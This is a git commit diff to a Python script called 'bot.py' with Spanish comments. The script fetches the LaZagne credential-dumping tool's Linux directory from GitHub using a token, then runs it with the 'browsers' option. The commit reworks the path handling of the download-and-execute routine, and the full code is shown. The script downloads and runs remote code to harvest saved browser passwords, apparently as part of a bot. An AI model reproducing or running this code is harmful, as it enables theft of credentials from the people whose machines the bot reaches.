06b49be802722d64ca56ce0eb6cf15f92e66a983
CyberMonkey <151052652+Pol-Ruiz@users.noreply.github.com>
2024-01-31 19:09:10 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -3,7 +3,7 @@ import requests
 import base64
 import os
 
-def downloadFile(urlb, token):
+def downloadFile(urlb, token, path):
     print('[!] Descargando ' + urlb)
     headers = {
         'Authorization': 'Bearer ' + token
@@ -15,27 +15,21 @@ def downloadFile(urlb, token):
                 print('[!] Descargando archivo ' + file_info['name'])
                 download_url = file_info['download_url']
                 file_content = requests.get(download_url).content
-                with open(os.path.join('Linux', file_info['name']), 'wb') as f:
+                with open(os.path.join(path, file_info['name']), 'wb') as f:
                     f.write(file_content)
             elif file_info['type'] == 'dir':  # Si es un directorio, lo exploramos
                 print('[!] Explorando directorio ' + file_info['name'])
-                new_path = os.path.join('Linux', file_info['name'])
+                new_path = os.path.join(path, file_info['name'])
                 os.makedirs(new_path, exist_ok=True)
-                downloadFile(file_info['url'], token)
+                downloadFile(file_info['url'], token, new_path)
     else:
         print('[-] ' + res.get('message', 'Error desconocido'))
 
 def run(token):
     urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
-    
-    # Crear la carpeta si no existe
-    if not os.path.exists('Linux'):
-        os.makedirs('Linux')
+    path = 'Linux'
+    os.makedirs(path, exist_ok=True)
+    downloadFile(urlb, token, path)
+    subprocess.run(["python3", os.path.join(path, 'laZagne.py'), "browsers"], check=True)
 
-    # Descargar el directorio
-    downloadFile(urlb, token)
-    
-    # Ejecutar el archivo con el argumento "all"
-    print('[!] Ejecutando laZagne.py')
-    subprocess.run(["python3", os.path.join('Linux', 'laZagne.py'), "browsers"], check=True)
 
